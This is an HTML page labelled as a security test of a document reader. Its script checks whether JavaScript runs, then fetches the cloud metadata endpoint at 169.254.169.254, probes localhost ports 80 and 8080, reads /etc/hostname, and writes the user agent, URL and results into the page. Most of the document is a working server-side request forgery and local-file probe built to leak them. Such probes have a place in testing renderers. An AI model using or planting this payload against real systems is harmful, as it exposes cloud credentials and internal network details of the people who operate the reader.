<!DOCTYPE html>
<html>
<head><title>Security Test Page</title></head>
<body>
<h1>Security Test Results</h1>
<p>This page tests whether JavaScript executes in the document reader.</p>
<p>STATIC_MARKER_ALPHA</p>
<div id="jstest">JAVASCRIPT_DID_NOT_EXECUTE</div>
<p>STATIC_MARKER_BETA</p>
<div id="info">NO_JS_INFO</div>
<p>STATIC_MARKER_GAMMA</p>
<div id="scan">NO_SCAN_RESULTS</div>
<p>END_OF_PAGE</p>
<script>
// Simple sync test first
document.getElementById('jstest').textContent = 'JAVASCRIPT_EXECUTED_SUCCESSFULLY';
document.getElementById('info').textContent = 'UA:' + navigator.userAgent + ' LOC:' + window.location.href;

// Async scan
(async function(){
  var r = [];
  try { var x = await fetch('http://169.254.169.254/latest/meta-data/'); r.push('META:' + await x.text()); } catch(e) { r.push('META_ERR:' + e.message); }
  try { var x = await fetch('http://127.0.0.1:80/'); r.push('LOCAL80:' + x.status); } catch(e) { r.push('LOCAL80_ERR:' + e.message); }
  try { var x = await fetch('http://127.0.0.1:8080/'); r.push('LOCAL8080:' + x.status); } catch(e) { r.push('LOCAL8080_ERR:' + e.message); }
  try { var x = await fetch('file:///etc/hostname'); r.push('HOSTNAME:' + await x.text()); } catch(e) { r.push('HOST_ERR:' + e.message); }
  document.getElementById('scan').textContent = r.join(' | ');
})();
</script>
</body>
</html>
